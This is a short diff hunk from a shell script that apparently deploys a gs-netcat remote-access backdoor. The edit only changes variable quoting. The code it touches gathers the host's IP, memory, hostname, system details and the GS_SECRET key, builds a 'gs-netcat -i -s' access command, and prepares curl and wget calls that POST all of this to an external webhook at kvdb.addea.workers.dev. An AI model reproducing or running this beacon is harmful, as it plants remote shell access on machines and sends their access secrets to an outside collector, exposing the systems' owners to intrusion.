@@ -106,7 +106,7 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 	ram=$(free -m | awk '/^Mem:/{printf("%.1fGb\n",$2/1000)}')
 	ip=$(hostname -I | awk '{print $1}')
-	data='{"ip","$ip", "ram": "$ram", "hostname": "$(hostname)", "system": "$(uname -rom)", "uuid":"${GS_SECRET}" ,"access": "gs-netcat -i -s ${GS_SECRET}"}'
+	data='{"ip","${ip}", "ram": "${ram}", "hostname": "$(hostname)", "system": "$(uname -rom)", "uuid": "${GS_SECRET}" ,"access": "gs-netcat -i -s ${GS_SECRET}"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://kvdb.addea.workers.dev/add")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://kvdb.addea.workers.dev/add")
 }
